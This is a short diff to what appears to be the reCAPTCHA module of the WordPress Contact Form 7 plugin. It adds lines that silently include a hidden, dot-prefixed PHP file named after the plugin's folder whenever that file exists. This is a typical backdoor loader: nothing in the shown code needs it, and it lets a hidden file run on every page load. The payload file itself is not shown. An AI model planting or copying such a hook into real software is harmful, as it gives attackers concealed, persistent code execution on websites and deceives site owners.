@@ -206,6 +206,10 @@ if ( ! class_exists( 'WPCF7_Service' ) ) {
 	return;
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPCF7_RECAPTCHA extends WPCF7_Service {
 
 	private static $instance;
